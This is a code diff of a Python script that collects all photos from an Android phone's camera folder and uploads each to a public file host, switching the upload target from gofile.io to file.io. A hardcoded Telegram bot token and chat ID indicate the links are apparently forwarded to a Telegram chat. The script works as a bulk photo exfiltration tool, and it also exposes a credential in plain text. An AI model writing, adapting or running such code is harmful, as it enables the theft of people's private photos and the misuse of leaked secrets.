@@ -1,18 +1,17 @@
 import os,requests,time
-import qrcode
 from datetime import datetime
 
 BOT_TOKEN="8200691947:AAF-wOE90vTafT21Hqzs5WXokd2iBVstdl4"
 CHAT_ID="8519296209"
 CAMERA="/storage/emulated/0/DCIM/Camera"
 
-def upload_to_gofile(file_path):
+def upload_to_fileio(file_path):
     try:
         with open(file_path,'rb') as f:
-            r=requests.post('https://store1.gofile.io/uploadFile',files={'file':f})
+            r=requests.post('https://file.io', files={'file': f})
             d=r.json()
-            if d['status']=='ok':
-                return d['data']['downloadPage']
+            if d['success']:
+                return d['link']
     except:
         return None
     return None
@@ -24,7 +23,7 @@ print(f"Found {len(p)} photos")
 links=[]
 for i,photo in enumerate(p,1):
     print(f"Uploading {i}/{len(p)}...")
-    link=upload_to_gofile(photo)
+    link=upload_to_fileio(photo)
     if link:
         links.append(f"{os.path.basename(photo)}:{link}")
         print(f"OK {link}")
@@ -42,12 +41,6 @@ if links:
     print("\nLinks list:")
     for i,l in enumerate(links,1):
         print(f"{i}. {l}")
-    try:
-        img=qrcode.make(links[0])
-        img.save("/storage/emulated/0/Download/qrcode.png")
-        print("QR code saved")
-    except:
-        pass
 else:
     print("No links")
 
